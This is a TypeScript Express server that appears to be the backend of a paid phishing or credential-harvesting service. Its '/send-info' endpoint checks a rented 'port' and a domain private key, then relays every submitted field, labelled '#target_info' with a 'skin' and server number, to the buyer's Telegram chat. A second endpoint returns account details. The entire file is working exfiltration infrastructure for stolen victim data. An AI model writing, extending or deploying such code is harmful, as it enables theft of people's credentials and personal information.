import { UserDatabase, DomainDatabase } from "./database";
import * as express from "express";
import * as telegram from "node-telegram-bot-api";
import * as nemoji from "node-emoji";
const Telegram = require("node-telegram-bot-api");

process.on("uncaughtExceptionMonitor", async (uexceptmonitor) => {
    console.error(uexceptmonitor);
})

process.on("unhandledRejection", async (unhandle) => {
    console.error(unhandle);
})

const userdb = new UserDatabase();
const domaindb = new DomainDatabase();
const app = express();
app.use(express.json());

const translationTable = {
    'q': 'ǫ', 'w': 'ᴡ', 'e': 'ᴇ', 'r': 'ʀ', 't': 'ᴛ',
    'y': 'ʏ', 'u': 'ᴜ', 'i': 'ɪ', 'o': 'ᴏ', 'p': 'ᴘ',
    'a': 'ᴀ', 's': 's', 'd': 'ᴅ', 'f': 'ғ', 'g': 'ɢ',
    'h': 'ʜ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'z': 'ᴢ',
    'x': 'x', 'c': 'ᴄ', 'v': 'ᴠ', 'b': 'ʙ', 'n': 'ɴ',
    'm': 'ᴍ'
};

interface InfoFace {
    port: string;
    private_key: string;
    server_number: number;
    skin: string;
    [key: string]: any;
}

app.post("/send-info", async (req, res) => {
    const info: InfoFace = req.body;

    console.log(info)

    if ((Object.keys(info).length - 4) > 20){
        return res.json({ status: false, message: "too many keys" });
    }

    if (!info.port || !info.private_key || !info.server_number){
        return res.json({ status: false, message: "invalid input" });
    }

    await userdb.getUserByPort(info.port, async (user) => {
        if (!user){
            return res.json({ status: false, message: "ports owner not found" });
        }

        if (user.ban){
            return res.json({ status: false, message: "ports owner has banned" });
        }

        console.log(user)
        const _theport = user.port.find(prt => prt.name === info.port);

        if (!_theport){
            return res.json({ status: false, message: "port doesnt match" });
        } else {
            await domaindb.getDomainByPrivateKey(info.private_key, async (dm) => {
                if (!dm){
                    return res.json({ status: false, message: "invalid private key" });
                }

                console.log(_theport)
                const bot: telegram = new Telegram(_theport.token);
                const entrie = Object.entries(info);
                let txt: string = build(`📦 | [ ${Object.keys(info).length - 4} ] items received\n`);
                for (const [k, v] of entrie){
                    if (typeof k !== "string"){continue};
                    if (k === "port"){continue};
                    if (k === "private_key"){continue};
                    if (k === "skin"){continue};
                    if (k === "server_number"){continue};
                    if (["string", "number", "boolean", "object"].includes(typeof v)){
                        txt += build(`\n${nemoji.random().emoji} | ${k.replace("_", " ")} : `) + `<code>${v}</code>`;
                    }
                }
                txt += `\n\n📦 | skin : ${info.skin}`
                txt += `\n🛜 | server number : ${info.server_number}`
                res.json({ status: true })
                return await bot.sendMessage(
                    _theport.chat,
                    build(`🕸️ new #target_info\n`) + txt,
                    {
                        parse_mode: "HTML"
                    }
                )
            })
        }
    })
})

app.post("/get-port-info", async (req, res) => {
    console.log(req.body)
    const { port, private_key }: { port: string, private_key: string } = req.body;

    if (!port || !private_key){
        return res.json({ status: false, message: "invalid input" })
    }

    await domaindb.getDomainByPrivateKey(private_key, async (domain) => {
        if (!domain){
            return res.json({ status: false, message: "invalid private key" });
        }

        await userdb.getUserByPort(port, async (user) => {
            if (!user){
                return res.json({ status: false, message: "invalid port name" });
            }

            const USR = user as any;
            USR.port = user.port.find(prt => prt.name === port);
            if (user.port === undefined){
                return res.json({ status: false, message: "invalid port name" });
            } else {
                delete USR.port.chat;
                delete USR.port.token;
                delete USR.port.bought_on;
                delete USR.coins;
                delete USR.id;
                delete USR.ban;
                return res.json({ status: true, user: user });
            }
        })
    })
})

app.listen(3000, "0.0.0.0", async () => {
    console.log(`[+] server runned on net-port 3000`);
})

function build(string: string) {
    return string.split('').map(char => translationTable[char] || char).join('');
}
